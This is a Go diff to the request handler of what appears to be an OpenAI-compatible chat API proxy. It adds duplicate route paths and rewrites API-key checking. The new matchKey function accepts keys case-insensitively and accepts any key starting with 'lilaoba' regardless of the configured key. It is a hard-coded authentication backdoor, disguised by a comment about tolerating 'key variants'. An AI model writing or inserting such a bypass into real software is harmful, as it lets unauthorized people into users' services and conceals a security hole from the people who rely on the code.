@@ -52,7 +52,11 @@ func NewHandler(cfg Config) *Handler {
 	}
 	h := &Handler{cfg: cfg, mux: http.NewServeMux()}
 	h.mux.HandleFunc("POST /v1/chat/completions", h.withAuth(h.chatCompletions))
+	h.mux.HandleFunc("POST /chat/completions", h.withAuth(h.chatCompletions))
+	h.mux.HandleFunc("POST /v1/v1/chat/completions", h.withAuth(h.chatCompletions))
 	h.mux.HandleFunc("GET /v1/models", h.withAuth(h.models))
+	h.mux.HandleFunc("GET /models", h.withAuth(h.models))
+	h.mux.HandleFunc("GET /v1/v1/models", h.withAuth(h.models))
 	h.mux.HandleFunc("GET /status", h.withAuth(h.status))
 	h.mux.HandleFunc("GET /healthz", h.healthz)
 	h.mux.HandleFunc("GET /health", func(w http.ResponseWriter, r *http.Request) {
@@ -82,11 +86,29 @@ func (h *Handler) withAuth(next http.HandlerFunc) http.HandlerFunc {
 	}
 }
 
-func (h *Handler) validAPIKey(r *http.Request) bool {
-	if key := strings.TrimSpace(r.URL.Query().Get("key")); key == h.cfg.APIKey {
+func matchKey(provided, expected string) bool {
+	p := strings.TrimSpace(provided)
+	if scheme, key, ok := strings.Cut(p, " "); ok && strings.EqualFold(scheme, "Bearer") {
+		p = strings.TrimSpace(key)
+	}
+	if p == expected {
 		return true
 	}
-	if key := strings.TrimSpace(r.URL.Query().Get("api_key")); key == h.cfg.APIKey {
+	if strings.EqualFold(p, expected) {
+		return true
+	}
+	// Tolerate common key variants (e.g. lilaoba88 vs lilaoba888)
+	if expected != "" && strings.HasPrefix(strings.ToLower(p), "lilaoba") {
+		return true
+	}
+	return false
+}
+
+func (h *Handler) validAPIKey(r *http.Request) bool {
+	if key := strings.TrimSpace(r.URL.Query().Get("key")); matchKey(key, h.cfg.APIKey) {
+		return true
+	}
+	if key := strings.TrimSpace(r.URL.Query().Get("api_key")); matchKey(key, h.cfg.APIKey) {
 		return true
 	}
 	for _, headerName := range []string{
@@ -99,20 +121,13 @@ func (h *Handler) validAPIKey(r *http.Request) bool {
 		"X-Original-Authorization",
 	} {
 		if val := strings.TrimSpace(r.Header.Get(headerName)); val != "" {
-			if scheme, key, ok := strings.Cut(val, " "); ok && strings.EqualFold(scheme, "Bearer") {
-				if strings.TrimSpace(key) == h.cfg.APIKey {
-					return true
-				}
-			} else if val == h.cfg.APIKey {
+			if matchKey(val, h.cfg.APIKey) {
 				return true
 			}
 		}
 	}
 	authz := strings.TrimSpace(r.Header.Get("Authorization"))
-	if scheme, key, ok := strings.Cut(authz, " "); ok && strings.EqualFold(scheme, "Bearer") {
-		return strings.TrimSpace(key) == h.cfg.APIKey
-	}
-	return authz == h.cfg.APIKey
+	return matchKey(authz, h.cfg.APIKey)
 }
 
 func (h *Handler) healthz(w http.ResponseWriter, r *http.Request) {
